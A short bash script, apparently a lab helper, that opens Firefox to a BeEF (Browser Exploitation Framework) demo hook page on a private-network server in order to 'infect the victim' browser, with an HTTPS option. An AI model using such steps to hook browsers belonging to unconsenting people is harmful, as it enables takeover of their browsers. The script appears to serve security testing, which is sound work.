##
#
#       This script is used to infect a victim with BEEF using Mozilla Firefox.
#       If 'https' is given as first parameter, the browser opens the https-URL instead of using http
#
##

if [ "$1" = "https" ]
then
	nohup /cygdrive/c/Program\ Files/Mozilla\ Firefox/firefox.exe https://172.16.151.119:3000/demos/basic.html &
	echo "infecting the victim with BEEF using HTTPS.."
else
	nohup /cygdrive/c/Program\ Files/Mozilla\ Firefox/firefox.exe 172.16.151.119:3000/demos/basic.html &
	echo "infecting the victim with BEEF.."
fi
sleep 5
